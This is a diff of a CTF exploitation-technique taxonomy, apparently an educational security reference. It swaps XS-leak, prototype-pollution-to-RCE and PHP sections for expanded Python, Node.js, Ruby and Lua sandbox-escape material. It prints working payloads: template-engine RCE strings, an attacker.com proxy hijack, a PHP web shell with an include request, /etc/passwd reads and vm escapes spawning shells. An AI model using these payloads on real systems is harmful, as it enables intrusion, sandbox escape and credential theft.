@@ -1,8 +1,8 @@
 # CTF Exotic Tricks — Advanced Exploitation Primitives Taxonomy
 
-> Unusual but practically valuable exploitation primitives recurring in top-tier CTFs (Google CTF, PlaidCTF, HITCON CTF, DiceCTF, corCTF, SekaiCTF, DEF CON CTF) that do not fit neatly into conventional vulnerability classes. Each technique has demonstrated real-world applicability in bug bounties or penetration testing.
+> Exploitation primitives recurring in top-tier CTFs (Google CTF, PlaidCTF, HITCON CTF, DiceCTF, corCTF, SekaiCTF, DEF CON CTF, jailCTF, KalmarCTF) that **do not have dedicated taxonomy documents** in the-map. Each technique has demonstrated real-world applicability in bug bounties or penetration testing.
 >
-> **Scope exclusion**: This document intentionally avoids overlap with existing the-map topics (SQL/NoSQL/Command Injection, XSS, SSTI, XXE, SSRF, Deserialization, HTTP Smuggling, Race Condition, IDOR, File Upload, JWT, OAuth, SAML, CSRF, CORS, Unicode, URL Confusion, ZIP, Prototype Pollution, Cache Poisoning, WAF Bypass, Cookie, Open Redirect, Mass Assignment, etc.). Basic CTF staples (PHP type juggling 101, `.git` exposure, simple padding oracle) are omitted — only structurally interesting or non-obvious mutations are included.
+> **Scope**: This document covers only primitives not systematically addressed elsewhere. For topics with dedicated documents, see the cross-reference at the end. The three sections below represent vulnerability classes that recur in CTF contexts but lack a natural home in the existing category structure.
 
 ---
 
@@ -18,374 +18,29 @@
 
 ## Table of Contents
 
-1. [XS-Leaks — Cross-Site Information Inference](#1-xs-leaks--cross-site-information-inference)
-2. [Prototype Pollution → RCE Gadget Chains](#2-prototype-pollution--rce-gadget-chains)
-3. [PHP Internals Exploitation](#3-php-internals-exploitation)
-4. [Advanced Sandbox / Jail Escape Primitives](#4-advanced-sandbox--jail-escape-primitives)
-5. [Cryptographic Misuse Beyond Textbook](#5-cryptographic-misuse-beyond-textbook)
-6. [Client-Side Isolation Bypass](#6-client-side-isolation-bypass)
-7. [Parser Differential Edge Cases](#7-parser-differential-edge-cases)
-8. [Injection into Exotic Processing Engines](#8-injection-into-exotic-processing-engines)
-9. [Argument & Environment Injection](#9-argument--environment-injection)
-10. [Advanced Race Condition Primitives](#10-advanced-race-condition-primitives)
-11. [Protocol-Level Exploitation Primitives](#11-protocol-level-exploitation-primitives)
-12. [Template Engine RCE Gadgets](#12-template-engine-rce-gadgets)
+1. [Sandbox & Jail Escape Primitives](#1-sandbox--jail-escape-primitives)
+2. [Cryptographic Misuse Primitives](#2-cryptographic-misuse-primitives)
+3. [Non-HTTP Parser Differentials](#3-non-http-parser-differentials)
+4. [Constrained Exploitation Primitives](#4-constrained-exploitation-primitives)
+5. [Browser-Native Side Channels & Mechanism Abuse](#5-browser-native-side-channels--mechanism-abuse)
+6. [Competition → Technique Cross-Reference](#6-competition--technique-cross-reference)
+7. [Cross-Reference to Dedicated Documents](#7-cross-reference-to-dedicated-documents)
 
 ---
 
-## 1. XS-Leaks — Cross-Site Information Inference
+## 1. Sandbox & Jail Escape Primitives
 
-> A family of browser side-channel techniques that infer cross-origin state without violating SOP directly. Each leak exploits a browser behavior that produces a measurable signal depending on the target page's content or authentication state. These are the backbone of modern top-tier CTF web challenges.
+> Language-level sandbox and jail escapes — techniques to achieve code execution or data exfiltration within intentionally restricted interpreter environments. These are the backbone of "jail" challenges across all major CTFs and are directly applicable to real-world sandbox products (online code editors, Jupyter notebooks, serverless function runtimes, CI/CD runners).
 
-### 1.1 Frame Counting Oracle (`window.length`)
+### 1.1 Python Jail Escapes
 
-**What is manipulated**: The number of frames/iframes in a cross-origin page is readable via `window.length`.
+#### 1.1.1 Garbage Collector Memory Archaeology (`gc.get_objects()` / `gc.get_referrers()`)
 
-```javascript
-const w = window.open('https://target.com/search?q=SECRET');
-setTimeout(() => {
-    // w.length reveals number of iframes in the response
-    // search results page: 0 iframes = no results, 1+ = results found
-    if (w.length > 0) { /* query matched */ }
-    w.close();
-}, 1000);
-```
-
-**Exploitation**: Binary search on secret values. If search results render differently (e.g., result cards in iframes), each query reveals whether the search term exists.
-
-### 1.2 Error/Load Event Oracle
-
-**What is manipulated**: `<script>`, `<img>`, `<link>` tags fire `onload` or `onerror` depending on the response status/content-type, leaking cross-origin state.
-
-```javascript
-// Detect if a user is logged in based on whether /api/profile returns 200 vs 401:
-const img = new Image();
-img.onload = () => { /* user is logged in (200 → valid image or non-image triggers onload for some elements) */ };
-img.onerror = () => { /* user is not logged in (401/403) */ };
-img.src = 'https://target.com/api/profile/avatar.png';
-
-// Script tag status oracle (CSP can interfere):
-const s = document.createElement('script');
-s.src = 'https://target.com/api/data?q=test';
-s.onload = () => { /* 200 response */ };
-s.onerror = () => { /* non-200 or CSP block */ };
-document.body.appendChild(s);
-```
-
-**Advanced variant — Content-Type confusion**: A `<script>` tag loading a JSON endpoint will fire `onerror` if the response is valid JSON with `application/json`, but `onload` if the server returns `text/javascript` — leaking content-type differences based on query parameters.
-
-### 1.3 Timing-Based XS-Leaks via Performance API
-
-**What is manipulated**: `performance.getEntriesByName()` reveals timing metadata for cross-origin resources loaded with `Timing-Allow-Origin`, but even without it, the *existence* of the entry and `duration` are measurable.
-
-```javascript
-// Detect redirect vs. direct response:
-const url = 'https://target.com/admin';
-fetch(url, { mode: 'no-cors', credentials: 'include' });
-setTimeout(() => {
-    const entries = performance.getEntriesByName(url);
-    if (entries.length > 0) {
-        // redirectCount, duration, transferSize (if TAO) reveal auth state
-        if (entries[0].redirectCount > 0) { /* not logged in, redirected to login */ }
-    }
-}, 2000);
-```
-
-### 1.4 Connection Pool State Partitioning Side-Channel
-
-**What is manipulated**: Browsers limit concurrent connections per host (typically 6 for HTTP/1.1). By saturating the pool and measuring when a probe request completes, you infer when a prior cross-origin request finished — revealing response time or size.
-
-```javascript
-// Saturate 5 of 6 connection slots:
-const blockers = [];
-for (let i = 0; i < 5; i++) {
-    blockers.push(fetch(`https://target.com/slow?${i}`, { mode: 'no-cors' }));
-}
-
-// The 6th slot: target request whose timing we want to measure
-const target = fetch('https://target.com/search?q=flag{a', { mode: 'no-cors' });
-
-// 7th request: probe. Blocked until one of the 6 finishes.
-const start = performance.now();
-await fetch(`https://target.com/probe`, { mode: 'no-cors' });
-const elapsed = performance.now() - start;
-// elapsed reveals which request finished first → infer target's response time
-```
-
-**Key insight**: Post-2023, browsers implement connection pool partitioning by (top-level-site, frame-site). But same-site iframes still share the pool, and HTTP/2 multiplexing makes this subtler — you need to force HTTP/1.1 or use WebSocket connection exhaustion.
-
-### 1.5 Cache Probing Oracle
-
-**What is manipulated**: Whether a resource is cached or not is detectable via timing (cache hit = fast, miss = slow) or via `performance.getEntries()` `transferSize`.
-
-```javascript
-// Step 1: Evict cache for target resource
-// Step 2: Navigate victim to a page that conditionally loads a resource
-// Step 3: Probe whether the resource was cached
-
-const probe = async (url) => {
-    const start = performance.now();
-    await fetch(url, { mode: 'no-cors', cache: 'force-cache' });
-    return performance.now() - start; // < 5ms = cached
-};
-```
-
-**Variant — Cache partitioning bypass**: Modern browsers partition cache by top-level site. But `<link rel="preload">` and Service Workers can interact with partitioned caches in non-obvious ways.
-
-### 1.6 `history.length` Probing
-
-**What is manipulated**: `history.length` increments on same-origin navigations but is readable cross-origin, revealing whether a redirect chain occurred.
-
-```javascript
-const w = window.open('https://target.com/maybe-redirect');
-setTimeout(() => {
-    // If the page triggered client-side redirects, history.length increases
-    // Reveals authentication state or conditional navigation logic
-    console.log(w.history.length);
-}, 2000);
-```
-
-### 1.7 Content-Disposition / Download Detection
-
-**What is manipulated**: When a server responds with `Content-Disposition: attachment`, the browser initiates a download instead of navigation. This is detectable because `window.open()` for a download doesn't navigate away — the opened window remains at `about:blank`.
-
-```javascript
-const w = window.open('https://target.com/export?format=csv&id=1');
-setTimeout(() => {
-    try {
-        w.origin; // throws if navigated cross-origin
-        // If we reach here, window didn't navigate → download occurred → id=1 exists
-    } catch {
-        // navigated → no download → id=1 doesn't exist or error page
-    }
-}, 1000);
-```
-
-### 1.8 CSP Violation Event Oracle
-
-**What is manipulated**: When CSP blocks a resource, a `SecurityPolicyViolationEvent` fires. If you control the CSP (e.g., via meta injection or a CSP-bearing iframe), you can detect whether cross-origin resources match specific patterns.
-
-```javascript
-document.addEventListener('securitypolicyviolation', (e) => {
-    // e.blockedURI reveals the URL that was blocked
-    // e.effectiveDirective reveals which directive triggered
-    // Useful for detecting whether a page loaded specific subresources
-});
-```
-
----
-
-## 2. Prototype Pollution → RCE Gadget Chains
-
-> Prototype pollution itself is covered in existing taxonomy. This section covers the **sink gadgets** — the specific code patterns in popular libraries/frameworks that convert prototype pollution into RCE or significant impact. These chains are the difference between a theoretical vulnerability and a critical exploit.
-
-### 2.1 EJS `opts.outputFunctionName` → RCE
-
-**Gadget**: EJS template engine reads `opts.outputFunctionName` from the options object. If polluted, this string is injected directly into generated code without sanitization.
-
-```javascript
-// Pollution:
-Object.prototype.outputFunctionName = 'x;process.mainModule.require("child_process").execSync("id");x';
-
-// When EJS renders any template:
-ejs.render('<%= "hello" %>', {});
-// Generated code includes: var x;process.mainModule.require("child_process").execSync("id");x = '';
-// → RCE
-```
-
-**Variants**: `opts.escapeFunction`, `opts.localsName`, `opts.destructuredLocals` are also injectable in certain EJS versions.
-
-### 2.2 Pug (Jade) AST Injection → RCE
-
-**Gadget**: Pug's AST compiler checks `block.type` to determine how to compile nodes. Polluting `block.type` to `"Code"` causes the block's value to be treated as executable code.
-
-```javascript
-Object.prototype.block = {
-    "type": "Text",
-    "val": "process.mainModule.require('child_process').execSync('id')"
-};
-// Pug compilation triggers code execution
-```
-
-### 2.3 Handlebars `lookupProperty` / `allowProtoPropertiesByDefault` → RCE
-
-**Gadget**: Handlebars 4.x added prototype access restrictions, but polluting `allowProtoPropertiesByDefault` or `allowProtoMethodsByDefault` re-enables dangerous property access.
-
-```javascript
-Object.prototype.allowProtoPropertiesByDefault = true;
-Object.prototype.allowProtoMethodsByDefault = true;
-
-// Now templates can access __proto__, constructor, etc.
-// Template: {{#with "s" as |string|}}{{#with (string.sub.apply 0 "constructor")}}{{this.call (this "return process.mainModule.require('child_process').execSync('id')")}}{{/with}}{{/with}}
-```
-
-### 2.4 `child_process.spawn` / `child_process.fork` Env Pollution → RCE
-
-**Gadget**: When `child_process.spawn()` or `fork()` is called without explicitly setting `env`, it inherits `process.env`. If prototype pollution can set `env` properties on the options object:
-
-```javascript
-Object.prototype.env = {
-    NODE_OPTIONS: '--require /proc/self/environ',
-    // or
-    NODE_DEBUG: 'child_process'
-};
-Object.prototype.shell = true;
-Object.prototype.argv0 = 'id';
-
-// Any subsequent child_process.spawn('node', [...]) uses polluted env
-```
-
-**More direct chain**:
-```javascript
-// If .shell is pollutable and the command is an array:
-Object.prototype.shell = '/proc/self/exe';
-Object.prototype.env = { 'NODE_OPTIONS': '--require=/tmp/evil.js' };
-```
-
-### 2.5 `process.env` via Prototype Pollution → `HTTP_PROXY` MITM
-
-**Gadget**: `process.env` in Node.js is a plain object. Libraries like `axios`, `got`, `node-fetch` read `process.env.HTTP_PROXY`. If prototype pollution reaches `process.env`:
-
-```javascript
-Object.prototype.HTTP_PROXY = 'http://attacker.com:8080';
-// All outbound HTTP requests from the server now proxy through attacker
-// → credential interception, API key theft
-```
-
-### 2.6 `Object.prototype.constructor.prototype` → Webpack Module Override
-
-**Gadget**: Webpack's module system uses objects with `exports` properties. Polluting the prototype chain can inject modules.
-
-```javascript
-Object.prototype.exports = { malicious: true };
-// Webpack require() may resolve polluted exports for missing modules
-```
-
----
-
-## 3. PHP Internals Exploitation
-
-> Beyond basic type juggling — advanced PHP-specific primitives that exploit the language runtime, extension internals, and operational quirks.
-
-### 3.1 `iconv()` Buffer Overflow → RCE (CVE-2024-2961)
-
-**What is manipulated**: glibc's `iconv()` has a buffer overflow when converting to `ISO-2022-CN-EXT`. PHP's `iconv()` function (and all filter chains using `convert.iconv`) are affected.
-
-```
-php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=data:,AAAA...
-```
-
-**Exploitation chain**: PHP filter chain with crafted iconv conversion → heap buffer overflow → arbitrary write → RCE. This converts **any** `file_get_contents()` or `include()` with user-controlled input into RCE, even without `allow_url_include`.
-
-**Impact**: Affects all PHP versions on glibc-based systems (nearly all Linux). Discovered by Charles Fol (LEXFO/Ambionics), presented at OffensiveCon 2024. Patched in glibc 2.40.
-
-**Key insight**: Unlike PHP filter chain RCE (which generates PHP code), this achieves native code execution via memory corruption — bypassing `disable_functions` entirely.
-
-### 3.2 PHP Session Upload Progress Race → LFI to RCE
-
-**What is manipulated**: When `session.upload_progress.enabled = On` (default), PHP creates a temporary session file containing user-controlled data during file upload, before the upload completes.
-
-```
-# Session file created at: /var/lib/php/sessions/sess_[PHPSESSID]
-# Content includes the upload progress data with user-controlled filename
-
-POST /upload.php HTTP/1.1
-Cookie: PHPSESSID=attacker_session
-
-Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
-<?php system($_GET['c']); ?>
-```
-
-**Race window**: The session file exists briefly during upload. A concurrent LFI request can include it:
-
-```
-GET /vuln.php?file=/var/lib/php/sessions/sess_attacker_session&c=id
-```
-
-**Key insight**: Works even when file upload itself is disabled — the session progress mechanism creates the file independently. Combine with `PHP_SESSION_UPLOAD_PROGRESS` parameter to control content.
-
-### 3.3 PHP Temporary File Name Prediction
-
-**What is manipulated**: PHP's `$_FILES` creates temp files at `/tmp/php[a-zA-Z0-9]{6}`. The name is generated by `mkstemp()`, which uses a sequential counter in some implementations.
-
-```
-File pattern: /tmp/php[A-Za-z0-9]{6}
-Total keyspace: 62^6 ≈ 56 billion — too large to brute force
-
-But: On older systems, mkstemp uses PID + timestamp, reducing keyspace dramatically.
-On modern Linux with systemd: /tmp is often per-service (PrivateTmp=true).
-```
-
-**Practical approach**: Combine with phpinfo() page to leak the temp filename, then race to include it before cleanup.
-
-### 3.4 `preg_replace()` with `/e` Modifier → Code Eval (PHP < 7)
-
-**What is manipulated**: The `/e` modifier causes `preg_replace()` to evaluate the replacement string as PHP code.
-
-```php
-// Vulnerable pattern (PHP < 7 only):
-preg_replace('/.*/e', 'system("$0")', $user_input);
-
-// With user control over the pattern:
-preg_replace($user_pattern, $user_replacement, $data);
-// Inject: pattern = "/x/e", replacement = "system('id')"
-```
-
-**Note**: Removed in PHP 7.0, but still found in legacy codebases. `preg_replace_callback()` is the safe replacement.
-
-### 3.5 `assert()` as `eval()` Alternative (PHP < 8)
-
-**What is manipulated**: In PHP 5.x-7.x, `assert()` accepts string arguments and evaluates them as PHP code.
-
-```php
-// If assert() is reachable with user input:
-assert("strpos('$user_input', 'admin') === 0");
-// Inject: user_input = x]') === 0 || system('id') || strpos('
-// → assert("strpos('x]') === 0 || system('id') || strpos('', 'admin') === 0");
-```
-
-**Deprecated in PHP 7.2, removed as code eval in PHP 8.0**. Still exploitable in legacy systems.
-
-### 3.6 `extract()` / `parse_str()` Variable Overwrite
-
-**What is manipulated**: `extract()` imports array keys as local variables. `parse_str()` (without second argument, PHP < 8) sets variables in the current scope.
-
-```php
-// Variable overwrite → auth bypass:
-$is_admin = false;
-extract($_GET);  // GET: ?is_admin=1 → $is_admin = "1" (truthy)
-
-// parse_str without second arg (PHP < 8):
-parse_str($query_string);  // Creates variables in current scope
-```
-
-### 3.7 PHP-FPM Direct Communication (FastCGI Protocol Injection)
-
-**What is manipulated**: If an SSRF can reach the PHP-FPM Unix socket or TCP port (default: 9000), raw FastCGI records can set arbitrary PHP configuration values per-request.
-
-```python
-# FastCGI record to execute arbitrary PHP:
-# Set PHP_VALUE: auto_prepend_file = /etc/passwd
-# Set PHP_ADMIN_VALUE: allow_url_include = On
-# Set SCRIPT_FILENAME: /var/www/html/index.php
-```
-
-**Tool**: `gopherus` generates Gopher payloads for PHP-FPM exploitation via SSRF.
-
-**Key insight**: Even with `disable_functions`, FastCGI `PHP_VALUE` can override `open_basedir`, `auto_prepend_file`, and other critical settings.
-
----
-
-## 4. Advanced Sandbox / Jail Escape Primitives
-
-> Beyond basic `__subclasses__()` traversal — advanced techniques from jailCTF 2025, KalmarCTF 2025, SECCON 2024, and PlaidCTF that push language runtime boundaries.
-
-### 4.1 Pyjail: `gc.get_referrers()` / `gc.get_objects()` Memory Archaeology
-
-**What is manipulated**: The garbage collector exposes references to all tracked Python objects, including those in "deleted" or "private" scopes.
+**What is manipulated**: Python's garbage collector tracks all objects in memory, including those in "deleted" or "private" scopes. The `gc` module provides direct traversal of the entire object graph.
 
 ```python
 import gc
+
 # Find all string objects containing 'FLAG':
 [obj for obj in gc.get_objects() if isinstance(obj, str) and 'FLAG' in obj]
 
@@ -394,13 +49,33 @@ funcs = [obj for obj in gc.get_objects() if callable(obj) and hasattr(obj, '__gl
 for f in funcs:
     if 'secret' in f.__globals__:
         print(f.__globals__['secret'])
+
+# Reverse reference traversal — find what references a target object:
+target = [obj for obj in gc.get_objects() if isinstance(obj, dict) and 'password' in obj]
+gc.get_referrers(target[0])  # reveals which module/function holds the secret dict
 ```
 
-**KalmarCTF 2025**: Used `gc` module with `numpy.genfromtxt` for file read in a restricted environment.
+**Variant — `numpy.genfromtxt()` file read** (KalmarCTF 2025): When `open()` and `os` are blocked but `numpy` is available:
+```python
+import numpy
+numpy.genfromtxt('/etc/passwd', dtype=str, delimiter='\n')
+```
 
-### 4.2 Pyjail: `help()` as Universal Import Primitive
+**Other library-based file reads when `open` is blocked**:
+| Library | Method | Example |
+|---------|--------|---------|
+| `numpy` | `genfromtxt()` / `loadtxt()` | `numpy.loadtxt('/etc/passwd', dtype=str)` |
+| `pandas` | `read_csv()` / `read_table()` | `pandas.read_csv('/etc/passwd', sep='\n', header=None)` |
+| `pathlib` | `Path.read_text()` | `pathlib.Path('/etc/passwd').read_text()` |
+| `fileinput` | `input()` | `list(fileinput.input('/etc/passwd'))` |
+| `tokenize` | `open()` | `tokenize.open('/etc/passwd').read()` |
+| `xml.etree` | `parse()` with XXE | `xml.etree.ElementTree.parse('/etc/passwd')` |
+| `linecache` | `getlines()` | `linecache.getlines('/etc/passwd')` |
+| `pkgutil` | `get_data()` | `pkgutil.get_data('.', '/etc/passwd')` |
 
-**What is manipulated**: Python's `help()` function internally imports modules to display documentation. In some environments where `import` is blocked, `help()` still works.
+#### 1.1.2 `help()` as Universal Import Primitive
+
+**What is manipulated**: Python's `help()` function internally imports modules to display their documentation. In jails where `import` / `__import__` are blocked, `help()` sidesteps the restriction.
 
 ```python
 # SECCON CTF 2024 Quals:
@@ -408,22 +83,35 @@ help()  # enters interactive help
 # type: modules  → lists all importable modules
 # type: os  → imports os module to show its help
 # After help() exits, os is now in sys.modules and accessible
+
+import sys
+sys.modules['os'].system('id')
 ```
 
-### 4.3 Pyjail: `__init_subclass__` / `__set_name__` Hooks
+**Variant — `importlib` reload**: If a module was previously imported but references were deleted:
+```python
+import importlib
+importlib.import_module('os').system('id')
+```
 
-**What is manipulated**: Python metaclass hooks execute arbitrary code when classes are defined, without explicit `eval`/`exec`.
+**Variant — `pkgutil.walk_packages()`**: Enumerates and triggers import of all findable packages.
+
+#### 1.1.3 Metaclass Hooks: `__init_subclass__` / `__set_name__` / `__class_getitem__`
+
+**What is manipulated**: Python metaclass hooks execute arbitrary code at class *definition time*, without explicit `eval`/`exec`. If the jail blocks function calls but permits class definitions, these hooks provide execution.
 
 ```python
+# __init_subclass__ — triggers when a subclass is defined:
 class X:
     def __init_subclass__(cls, **kwargs):
         __import__('os').system('id')
 
-class Y(X):  # triggers __init_subclass__ → RCE
+class Y(X):  # defining Y triggers __init_subclass__ → RCE
     pass
 ```
 
 ```python
+# __set_name__ — triggers when a descriptor is assigned as a class attribute:
 class Descriptor:
     def __set_name__(self, owner, name):
         __import__('os').system('id')
@@ -432,730 +120,883 @@ class X:
     attr = Descriptor()  # triggers __set_name__ → RCE
 ```
 
-### 4.4 Pyjail: Walrus Operator + Exception Handler Scope Leaking
+```python
+# __class_getitem__ — triggers on class subscription:
+class X:
+    def __class_getitem__(cls, item):
+        __import__('os').system('id')
+
+X['anything']  # triggers __class_getitem__ → RCE
+```
 
 ```python
-# Python 3.8+ walrus operator for scope leaking:
+# __del__ — triggers on object destruction:
+class Evil:
+    def __del__(self):
+        __import__('os').system('id')
+
+e = Evil()
+del e  # or let it go out of scope
+```
+
+#### 1.1.4 Walrus Operator + Comprehension Scope Leaking
+
+**What is manipulated**: Python 3.8+ walrus operator (`:=`) leaks bindings from comprehension scope to the enclosing scope, bypassing scope isolation.
+
+```python
+# Leak import result out of a comprehension:
 [y := __import__('os') for x in [1]]
 y.system('id')  # y is now accessible in the outer scope
 
-# Exception variable scope abuse:
+# Chain with attribute access where direct import is blocked:
+[z := ''.__class__.__mro__[1].__subclasses__() for _ in [1]]
+# z now contains the subclass list in the outer scope
+```
+
+**Exception variable scope abuse**:
+```python
 try:
     1/0
 except Exception as e:
-    e.__class__.__base__.__subclasses__()  # access from exception handler scope
+    # Python 3 deletes 'e' after the except block, but:
+    result = e.__class__.__base__.__subclasses__()
+# result survives the block
 ```
 
-### 4.5 Pyjail: Code Object Surgery
+#### 1.1.5 Code Object Surgery (Bytecode Manipulation)
 
-**What is manipulated**: Python code objects (`types.CodeType`) can be constructed with arbitrary bytecode, bypassing AST-level restrictions.
+**What is manipulated**: Python code objects (`types.CodeType`) can be constructed with arbitrary bytecode, bypassing AST-level source code auditing.
 
 ```python
 import types
 
-# Create a code object that calls os.system("id"):
-# 1. Get a reference to os.system via __subclasses__
-# 2. Construct bytecode that calls it
+# Build a code object from raw bytecode:
+# This bypasses any AST-based sanitizer because there is no source to parse.
+#
+# Strategy:
+# 1. Obtain a reference to a dangerous function via __subclasses__ or gc
+# 2. Extract its code object or build one from scratch
 # 3. Wrap in a function and call
 
-co = types.CodeType(
-    0, 0, 0, 0, 0, 0,
-    bytes([100, 0, 83, 0]),  # LOAD_CONST 0, RETURN_VALUE
-    (None,), (), (), '', '', 0, b'', (), ()
+# Example: replace a function's code object
+def dummy(): pass
+
+# Craft new code object with different bytecode
+new_code = dummy.__code__.replace(
+    co_code=bytes([100, 0, 83, 0]),  # LOAD_CONST 0, RETURN_VALUE
+    co_consts=(None,)
 )
+dummy.__code__ = new_code
 ```
 
-**jailCTF 2025**: Featured challenges requiring bytecode-level manipulation to escape auditing of the AST.
+**jailCTF 2025**: Multiple challenges required bytecode-level construction to escape environments that audited the AST (using `ast.parse` + `ast.walk`) but not the bytecode.
 
-### 4.6 Node.js `vm` Escape via `WeakRef` / `FinalizationRegistry`
+**Variant — `ctypes` for memory manipulation**: If `ctypes` is available:
+```python
+import ctypes
+# Directly manipulate Python object internals in memory
+# Modify refcount, type pointers, or function code pointers
+```
 
-**What is manipulated**: `WeakRef` and `FinalizationRegistry` callbacks execute in the host realm, not the sandbox realm, providing an escape path.
+#### 1.1.6 Built-in Function Abuse for Import-Free Execution
+
+When `import`, `__import__`, `eval`, `exec`, `compile` are all blocked:
+
+| Technique | Mechanism | Example |
+|-----------|-----------|---------|
+| **`breakpoint()`** | Drops into `pdb` debugger which has full Python access | `breakpoint()` → `import os; os.system('id')` at pdb prompt |
+| **`license()`** | Opens pager, which may invoke shell commands | `license()` → input redirection to shell |
+| **`exit.__class__.__call__`** | Abuse Quitter objects to access `__call__` chain | Traverse to `__builtins__` via `exit.__class__` |
+| **`print.__class__`** | Traverse from any built-in to `type` → `__subclasses__` | `print.__class__.__base__.__subclasses__()` |
+| **`type.__subclasses__(type)`** | Enumerate all metaclasses → reach module types | Find `_ModuleLock` or similar → access `sys.modules` |
+| **f-string eval** | `f"{__import__('os').system('id')}"` — sometimes allowed when `eval()` is blocked | `f"{''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True)}"` |
+
+#### 1.1.7 Audit Hook Bypass Techniques
+
+Python 3.8+ added `sys.addaudithook()` for monitoring sensitive operations. CTF jails increasingly use this.
+
+| Technique | Mechanism |
+|-----------|-----------|
+| **`os.kill` + signal** | Some audit hooks don't monitor signal delivery; send signal to own process to trigger handler |
+| **`ctypes` native call** | C-level calls bypass Python audit hooks entirely |
+| **Segfault handler** | Cause a controlled segfault, use signal handler for code execution |
+| **Thread-level escape** | Start a thread before audit hook is installed; thread inherits pre-hook state |
+| **`_thread._set_sentinel`** | Internal thread API not covered by standard audit events |
+
+#### 1.1.8 `sys.settrace()` / `sys.setprofile()` Execution Hooks
+
+```python
+import sys
+
+# settrace: called on every line, call, return, exception
+def tracer(frame, event, arg):
+    if event == 'call' and frame.f_code.co_name == 'check_password':
+        frame.f_locals['password'] = 'attacker_value'
+        # Or: inspect frame.f_locals to steal secrets
+    return tracer
+
+sys.settrace(tracer)
+```
+
+**Key insight**: Even if a jail prevents you from *calling* sensitive functions, `settrace` lets you intercept and modify execution at every point — including reading local variables of protected functions.
+
+### 1.2 JavaScript Sandbox Escapes (Node.js `vm` Module)
+
+> Node.js `vm` module creates "sandboxed" contexts, but it was never designed as a security boundary. These escapes are relevant to any application using `vm.runInNewContext()`, `vm.createContext()`, or `vm2` (now deprecated).
+
+#### 1.2.1 `constructor.constructor` Classic Escape
+
+```javascript
+// Inside vm sandbox:
+this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString();
+```
+
+**Why it works**: `this.constructor` is `Object`, and `Object.constructor` is `Function`. `Function('return process')()` creates a function in the host realm and returns the host's `process` object.
+
+#### 1.2.2 `WeakRef` / `FinalizationRegistry` Realm Escape
+
+**What is manipulated**: `FinalizationRegistry` callbacks execute in the *host* realm (not the sandbox realm) after garbage collection of the registered object.
 
 ```javascript
 // Inside vm sandbox:
 const fr = new FinalizationRegistry((ref) => {
-    // This callback runs in host context
-    // ref.constructor.constructor('return process')().mainModule.require('child_process').execSync('id');
+    // This callback runs in host context — full access to process, require, etc.
+    const cp = ref.constructor.constructor('return process')()
+                  .mainModule.require('child_process');
+    cp.execSync('id');
 });
+
+fr.register({}, 'ref-value');
+// Trigger GC (implementation-dependent — allocate heavily to pressure GC)
 ```
 
-### 4.7 Node.js `vm` Escape via `import()` Dynamic Import
+#### 1.2.3 `import()` Dynamic Import Escape
 
 ```javascript
 // vm sandbox context:
-import('child_process').then(cp => cp.execSync('id'));
+import('child_process').then(cp => {
+    cp.execSync('id');
+});
 // import() resolves in the host module system, not the sandbox
 ```
 
-**Mitigation**: Requires `--experimental-vm-modules` flag or specific ESM configuration.
+**Key condition**: Requires `--experimental-vm-modules` flag or specific ESM configuration. Available by default in newer Node.js versions with ESM support.
+
+#### 1.2.4 Proxy `apply` Trap — `argumentsList` Realm Leak
+
+**What is manipulated**: When a Proxy's `apply` trap is invoked, the third argument (`argumentsList`) is a real JavaScript Array allocated in the *host* realm. This leaked reference provides access to the host context's `Object.prototype`, enabling full sandbox escape.
+
+```javascript
+// DiceCTF 2023 "jwtjail":
+// Inside vm sandbox:
+const handler = {
+    apply(target, thisArg, argumentsList) {
+        // argumentsList is an Array from the HOST realm!
+        // argumentsList.constructor → host's Array
+        // argumentsList.constructor.constructor → host's Function
+        const hostFunction = argumentsList.constructor.constructor;
+        const process = hostFunction('return process')();
+        process.binding('spawn_sync').spawn({
+            file: '/bin/sh',
+            args: ['/bin/sh', '-c', 'id'],
+            stdio: [{type: 'pipe'}, {type: 'pipe'}, {type: 'pipe'}]
+        });
+    }
+};
+
+const proxy = new Proxy(function(){}, handler);
+proxy();  // triggers apply trap → escape
+```
+
+**Why it works**: V8 allocates the arguments array for `Proxy.apply` traps in the calling realm (host), not the proxy's realm (sandbox). This is a fundamental design issue — any function call on a Proxy can trigger a cross-realm object leak.
+
+#### 1.2.5 `vm2` Historical Escapes (Pre-Deprecation)
+
+`vm2` (now deprecated, replaced by `isolated-vm`) had a history of sandbox escapes:
+
+| CVE | Mechanism | Version |
+|-----|-----------|---------|
+| CVE-2023-37466 | `Promise` job callback runs in host context | vm2 < 3.9.19 |
+| CVE-2023-32314 | Host `Error` object leaks through `prepareStackTrace` | vm2 < 3.9.17 |
+| CVE-2023-29199 | `Symbol.species` on `Promise` subclass leaks `Function` | vm2 < 3.9.16 |
+| CVE-2022-36067 | `Error().prepareStackTrace` callback runs in host | vm2 < 3.9.11 |
+
+**Lesson**: `vm2` was patched and re-broken repeatedly. If you encounter it in a CTF, search for the specific version's known escapes first.
+
+### 1.3 Ruby Sandbox / Jail Escapes
+
+| Technique | Mechanism |
+|-----------|-----------|
+| **`send()` method dispatch** | `"".send(:system, "id")` — `send` bypasses visibility checks (private/protected) |
+| **`instance_eval` / `class_eval`** | Evaluate arbitrary code in the context of any object/class |
+| **`Kernel#__method__` traversal** | `method(:system).call("id")` — obtain Method object, call it |
+| **`ObjectSpace.each_object`** | Enumerate all live Ruby objects (like Python's `gc.get_objects`) |
+| **`Fiddle` FFI** | Direct C function calls: `Fiddle::Function.new(Fiddle::Handle['system'], [Fiddle::TYPE_VOIDP], Fiddle::TYPE_INT).call("id")` |
+| **ERB `binding`** | `ERB.new("<%= system('id') %>").result(binding)` — if ERB is available |
+
+### 1.4 Lua Sandbox Escapes
+
+| Technique | Mechanism |
+|-----------|-----------|
+| **`debug.getregistry()`** | Access the Lua registry — contains references to all loaded C functions |
+| **`debug.getinfo()` + `debug.getupvalue()`** | Inspect and modify upvalues of any function, including sandboxed ones |
+| **`load()`/`loadstring()` bytecode** | Load pre-compiled Lua bytecode that bypasses source-level sandboxing |
+| **`os.execute` via `debug` module** | If `debug` library is loaded: traverse from `debug.getregistry` to `os` |
+| **Metatable manipulation** | `getmetatable("").__index = os` — inject `os` functions into string metatable |
 
 ---
 
-## 5. Cryptographic Misuse Beyond Textbook
+## 2. Cryptographic Misuse Primitives
 
-> Beyond basic padding oracle and hash extension — advanced cryptographic misuse patterns from PlaidCTF, HITCON Crypto, and real-world applications.
